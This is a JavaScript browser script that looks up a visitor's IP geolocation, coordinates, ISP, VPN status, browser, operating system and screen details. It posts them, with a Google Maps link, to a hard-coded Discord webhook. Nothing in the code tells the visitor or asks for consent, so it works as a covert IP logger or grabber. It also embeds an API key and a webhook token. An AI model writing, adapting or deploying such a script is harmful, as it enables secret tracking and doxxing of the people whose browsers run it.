function fetchGoogleMapsLocation(latitude, longitude) {
    return `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
}

function fetchWeatherData(city) {
    const apiKey = "04156fa1016d4d03ba651651240510";
    const apiUrl = `https://api.weatherapi.com/v1/current.json?key=${apiKey}&q=${city}&aqi=no`;

    return fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            return {
                temp_c: data.current.temp_c,
                temp_f: data.current.temp_f
            };
        });
}

fetch("http://ip-api.com/json/")
.then(response => response.json())
.then(ipData => {
    const latitude = ipData.lat;
    const longitude = ipData.lon;
    const googleMapsLink = fetchGoogleMapsLocation(latitude, longitude);

    fetchWeatherData(ipData.city)
    .then(weatherData => {
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
        const isOnline = navigator.onLine ? "Yes" : "No";
        const browserName = (() => {
            const ua = navigator.userAgent;
            if (ua.includes("Firefox")) return "Firefox";
            if (ua.includes("Chrome")) return "Chrome";
            if (ua.includes("Safari")) return "Safari";
            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
            if (ua.includes("Edge")) return "Edge";
            if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
            return "Unknown";
        })();
        const operatingSystem = (() => {
            const ua = navigator.userAgent;
            if (ua.includes("Win")) return "Windows";
            if (ua.includes("Mac")) return "MacOS";
            if (ua.includes("X11")) return "UNIX";
            if (ua.includes("Linux")) return "Linux";
            return "Unknown";
        })();

        const embed = {
            "embeds": [{
                "title": "coda",
                "color": 3447003,
                "fields": [
                    {
                        "name": "🌍 Country",
                        "value": `${ipData.country} :flag_${ipData.countryCode.toLowerCase()}:`
                    },
                    {
                        "name": "📍 Region",
                        "value": `${ipData.region} (${ipData.regionName})`
                    },
                    {
                        "name": "🌆 City",
                        "value": `${ipData.city}`
                    },
                    {
                        "name": "🏠 Zip",
                        "value": `${ipData.zip || 'Not available'}`
                    },
                    {
                        "name": "🌐 Coordinates",
                        "value": `Latitude: ${latitude}, Longitude: ${longitude}`
                    },
                    {
                        "name": "⏰ Timezone",
                        "value": `${ipData.timezone} :clock2:`
                    },
                    {
                        "name": "📡 ISP",
                        "value": `${ipData.isp}`
                    },
                    {
                        "name": "🏢 Organization",
                        "value": `${ipData.org || 'Not available'}`
                    },
                    {
                        "name": "🛰️ AS",
                        "value": `${ipData.as}`
                    },
                    {
                        "name": "🔍 Query",
                        "value": `${ipData.query}`
                    },
                    {
                        "name": "🔒 VPN (Unstable)",
                        "value": `${ipData.proxy ? "Yes" : "No"}`
                    },
                    {
                        "name": "📱 Mobile (Unstable)",
                        "value": `${ipData.mobile ? "Yes" : "No"}`
                    },
                    {
                        "name": "🌡️ Temperature",
                        "value": `${weatherData.temp_c}°C / ${weatherData.temp_f}°F`
                    },
                    {
                        "name": "📍 Location on Google Maps",
                        "value": `[View on Google Maps](${googleMapsLink})`
                    },
                    {
                        "name": "💻 User Agent",
                        "value": `${userAgent}`
                    },
                    {
                        "name": "🖥️ Platform",
                        "value": `${platform}`
                    },
                    {
                        "name": "🗣️ Language",
                        "value": `${language}`
                    },
                    {
                        "name": "📏 Screen Resolution",
                        "value": `${screenWidth} x ${screenHeight}`
                    },
                    {
                        "name": "🌐 Online",
                        "value": `${isOnline}`
                    },
                    {
                        "name": "🌍 Browser",
                        "value": `${browserName}`
                    },
                    {
                        "name": "🖥️ Operating System",
                        "value": `${operatingSystem}`
                    }
                ]
            }]
        };

        const webhookUrl = "https://discord.com/api/webhooks/1288432286907240479/UBEbEtmeyV_SET33zC0n5Qq98bs_2TtW2WZCnMVi8CdaWmri9Jjey2UE7Ni00MuEn0H8";
        fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(embed)
        });
    });
});
